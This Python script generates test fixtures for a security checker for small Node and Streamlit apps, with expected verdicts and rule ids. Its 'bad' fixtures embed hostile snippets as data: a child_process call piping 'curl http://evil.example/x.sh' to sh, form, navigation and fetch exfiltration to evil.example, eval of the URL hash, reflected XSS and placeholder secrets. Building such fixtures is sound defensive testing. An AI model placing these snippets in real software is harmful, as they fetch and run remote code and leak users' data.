#!/usr/bin/env python3
"""Generate test fixtures. Each fixture = a tiny app + expected.json.

expected.json: {"verdict": ..., "rules": [rule ids that MUST fire]}
Run:  python3 tests/make_fixtures.py   (idempotent; rewrites tests/fixtures/)
"""
import json
import os
import shutil

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")
BLESSED = "http://blessed.test/"

APP_YML = """version: 2
name: {name}
query_warehouse: APP_WH
default_target: preview
targets:
  preview: {{database: USER$, schema: PUBLIC}}
  prod: {{database: APPS, schema: PROD}}
run:
  command: ["node", "server.js"]
{extra}"""

NPMRC = f"registry={BLESSED}\naudit=false\n"


def lock(deps, registry=BLESSED):
    pk = {"": {"name": "app", "version": "1.0.0", "dependencies": {k: v for k, v in deps.items()}}}
    for k, v in deps.items():
        pk[f"node_modules/{k}"] = {"version": v, "resolved": f"{registry}{k}/-/{k}-{v}.tgz",
                                   "integrity": "sha512-AAAA"}
    return json.dumps({"name": "app", "version": "1.0.0", "lockfileVersion": 3, "packages": pk}, indent=1)


def node_app(name, files, extra_yml="", deps=None, registry=BLESSED, npmrc=True):
    deps = deps if deps is not None else {"express": "4.22.3"}
    base = {
        "app.yml": APP_YML.format(name=name.upper().replace("-", "_"), extra=extra_yml),
        "package.json": json.dumps({"name": "app", "version": "1.0.0", "private": True,
                                    "dependencies": deps}, indent=1),
        "package-lock.json": lock(deps, registry),
    }
    if npmrc:
        base[".npmrc"] = NPMRC
    base.update(files)
    return base


def st_app(name, py):
    return {"snowflake.yml": f"""definition_version: 2
entities:
  app:
    type: streamlit
    identifier: {{name: {name.upper().replace('-', '_')}}}
    query_warehouse: APP_WH
    main_file: streamlit_app.py
""", "streamlit_app.py": py}


SAFE_SERVER = """const express = require("express");
const path = require("path");
const app = express();
app.use(express.static(path.join(__dirname, "public")));
app.get("/api/data", (req, res) => res.json({ rows: [1, 2, 3] }));
app.listen(8080, "0.0.0.0");
"""

FIXTURES = {
    # ------------------------------------------------------------------ bad
    "bad/xss-inline-html": ("REFUSE", ["html-inline-script"], node_app("xss-inline", {
        "server.js": SAFE_SERVER,
        "public/index.html": "<html><body><p id=s>x</p>\n<script>\ndocument.getElementById('s').textContent='INLINE_SCRIPT_RAN';\n</script></body></html>\n"})),
    "bad/inline-handler": ("REFUSE", ["html-inline-handler"], node_app("inline-handler", {
        "server.js": SAFE_SERVER,
        "public/index.html": "<html><body><img src=x onerror=\"fetch('/beacon')\"></body></html>\n"})),
    "bad/eval": ("REFUSE", ["client-eval"], node_app("eval", {
        "server.js": SAFE_SERVER,
        "public/app.js": "const code = location.hash.slice(1);\neval(code);\n"})),
    "bad/form-exfil": ("REFUSE", ["client-form-action", "html-external-form"], node_app("form-exfil", {
        "server.js": SAFE_SERVER,
        "public/index.html": "<form id=f method=post action=\"https://evil.example/collect\"><input name=d></form>\n",
        "public/app.js": "const f = document.getElementById('f');\nf.action = 'https://evil.example/c';\nf.d.value = JSON.stringify(window.rows);\nf.submit();\n"})),
    "bad/navigation-exfil": ("REFUSE", ["client-external-navigation"], node_app("nav-exfil", {
        "server.js": SAFE_SERVER,
        "public/app.js": "fetch('/api/data').then(r => r.text()).then(t => {\n  location.href = 'https://evil.example/?d=' + encodeURIComponent(t);\n});\n"})),
    "bad/protocol-relative-nav": ("REFUSE", ["client-external-navigation"], node_app("proto-rel", {
        "server.js": SAFE_SERVER,
        "public/app.js": "location.href = '//evil.example/?d=1';\n"})),
    "bad/reflected-xss": ("REFUSE", ["server-reflected-xss"], node_app("reflected", {
        "server.js": "const express = require('express');\nconst app = express();\napp.get('/echo', (req, res) => {\n  res.send(`<div>echo: ${req.query.q}</div>`);\n});\napp.listen(8080);\n"})),
    "bad/webrtc": ("REFUSE", ["client-webrtc"], node_app("webrtc", {
        "server.js": SAFE_SERVER,
        "public/app.js": "const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.example.org'}]});\nconst ch = pc.createDataChannel('x');\n"})),
    "bad/foreign-fetch": ("REFUSE", ["client-foreign-connect"], node_app("foreign-fetch", {
        "server.js": SAFE_SERVER,
        "public/app.js": "fetch('https://api.evil.example/upload', {method: 'POST', body: document.body.innerText});\nconst ws = new WebSocket('wss://evil.example/s');\n"})),
    "bad/react-dangerous": ("REFUSE", ["client-react-dangerous-html"], node_app("react-danger", {
        "server.js": SAFE_SERVER,
        "src/Note.jsx": "export default function Note({ html }) {\n  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n}\n"})),
    "bad/child-process": ("REFUSE", ["server-child-process"], node_app("child", {
        "server.js": "const { exec } = require('child_process');\nexec('curl -s http://evil.example/x.sh | sh');\n"})),
    "bad/privileged-role": ("REFUSE", ["manifest-privileged-role"], node_app("priv", {"server.js": SAFE_SERVER},
                                                                             extra_yml="execute_as_role: ACCOUNTADMIN\n")),
    "bad/secret-env": ("REFUSE", ["secret-file"], node_app("secret", {
        "server.js": SAFE_SERVER, ".env": "SNOWFLAKE_PASSWORD=hunter2hunter2hunter2\n"})),
    "bad/secret-in-code": ("REFUSE", ["secret-snowflake-credential"], node_app("secret-code", {
        "server.js": SAFE_SERVER + "const SNOWFLAKE_TOKEN = 'abcd1234efgh5678ijkl';\n"})),
    "bad/npm-public": ("REFUSE", ["npm-provenance"], node_app("npm-public", {"server.js": SAFE_SERVER},
                                                              registry="https://registry.npmjs.org/", npmrc=False)),
    "bad/no-manifest": ("REFUSE", ["manifest-missing"], {"server.js": SAFE_SERVER}),
    "bad/streamlit-computed-link": ("REFUSE", ["st-computed-link"], st_app("st-link", (
        "import streamlit as st\nrows = st.session_state.get('rows')\n"
        "st.link_button('Open', 'https://evil.example/?d=' + str(rows))\n"))),
    # ---------------------------------------------------------------- rewrite
    "bad/external-script": ("REWRITE", ["html-external-script"], node_app("ext-script", {
        "server.js": SAFE_SERVER,
        "public/index.html": "<html><head><script src=\"https://cdn.evil.example/t.js\"></script></head><body>ok</body></html>\n"})),
    "bad/send-beacon": ("REWRITE", ["client-send-beacon"], node_app("beacon", {
        "server.js": SAFE_SERVER,
        "public/app.js": "document.getElementById('b').textContent = 'hi';\nnavigator.sendBeacon('/track', JSON.stringify({page: 1}));\n"})),
    "bad/cookie-domain": ("REWRITE", ["server-cookie-domain"], node_app("cookie", {
        "server.js": SAFE_SERVER.replace(
            'app.get("/api/data"',
            'app.get("/login", (req, res) => { res.setHeader("Set-Cookie", "sid=abc; Path=/; Domain=.snowflakecomputing.app; Secure"); res.end("ok"); });\napp.get("/api/data"')})),
    "bad/log-token": ("REWRITE", ["server-log-caller-token"], node_app("logtok", {
        "server.js": SAFE_SERVER.replace(
            'app.get("/api/data", (req, res) =>',
            'app.get("/api/data", (req, res) => {\n  console.log("request", req.headers);\n  return res.json({ rows: [1] });\n});\napp.get("/api/x", (req, res) =>')})),
    "bad/runtime-eai": ("REWRITE", ["manifest-runtime-eai"], node_app("eai", {"server.js": SAFE_SERVER},
                                                                      extra_yml="external_access_integrations: [OPEN_INTERNET_EAI]\n")),
    "bad/streamlit-unsafe-html": ("REWRITE", ["st-unsafe-html"], st_app("st-unsafe", (
        "import streamlit as st\nname = st.text_input('name')\n"
        "st.markdown(f'<b>Hello {name}</b>', unsafe_allow_html=True)\n"))),
    # ------------------------------------------------------------------- hold
    "bad/streamlit-components-html": ("HOLD", ["st-raw-html"], st_app("st-comp", (
        "import streamlit as st\nimport streamlit.components.v1 as components\n"
        "components.html('<div id=x></div>', height=100)\n"))),
    "bad/global-state": ("HOLD", ["server-global-state"], node_app("global", {
        "server.js": SAFE_SERVER.replace('app.listen', 'global.lastResult = null;\napp.listen')})),
    # ------------------------------------------------------------------- good
    "good/express-static": ("PASS", [], node_app("good-express", {
        "server.js": SAFE_SERVER,
        "public/index.html": "<html><head><script src=\"/app.js\" defer></script></head>\n<body><ul id=list></ul>\n<form action=\"/submit\" method=post><input name=q><button>Go</button></form></body></html>\n",
        "public/app.js": ("fetch('/api/data').then(r => r.json()).then(d => {\n"
                          "  const ul = document.getElementById('list');\n"
                          "  d.rows.forEach(v => { const li = document.createElement('li'); li.textContent = v; ul.appendChild(li); });\n"
                          "});\ndocument.querySelector('button').addEventListener('click', () => { location.href = '/done'; });\n")})),
    "good/react-component": ("PASS", [], node_app("good-react", {
        "server.js": SAFE_SERVER,
        "src/Table.tsx": ("import { useEffect, useState } from 'react';\n"
                          "export default function Table() {\n"
                          "  const [rows, setRows] = useState<number[]>([]);\n"
                          "  useEffect(() => { fetch('/api/data').then(r => r.json()).then(d => setRows(d.rows)); }, []);\n"
                          "  return <ul onClick={() => setRows([])}>{rows.map(r => <li key={r}>{r}</li>)}</ul>;\n"
                          "}\n")}, deps={"express": "4.22.3", "react": "18.3.1"})),
    "good/streamlit": ("PASS", [], st_app("good-st", (
        "import streamlit as st\nst.title('Sales')\nst.markdown('**Plain markdown**')\n"
        "st.dataframe([{'a': 1}])\nst.link_button('Docs', 'https://docs.snowflake.com/')\n"))),
}
# good/streamlit has a fixed external doc link -> WARN st-external-link -> HOLD. Keep it honest:
FIXTURES["good/streamlit"] = ("HOLD", ["st-external-link"], FIXTURES["good/streamlit"][2])
FIXTURES["good/streamlit-internal"] = ("PASS", [], st_app("good-st2", (
    "import streamlit as st\nst.title('Sales')\nst.markdown('**Plain markdown**')\nst.dataframe([{'a': 1}])\n")))


def main():
    shutil.rmtree(ROOT, ignore_errors=True)
    for name, (verdict, rules, files) in FIXTURES.items():
        d = os.path.join(ROOT, name)
        for rel, content in files.items():
            p = os.path.join(d, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            with open(p, "w") as fh:
                fh.write(content)
        with open(os.path.join(d, "expected.json"), "w") as fh:
            json.dump({"verdict": verdict, "rules": rules}, fh)
    print(f"{len(FIXTURES)} fixtures in {ROOT}")


if __name__ == "__main__":
    main()
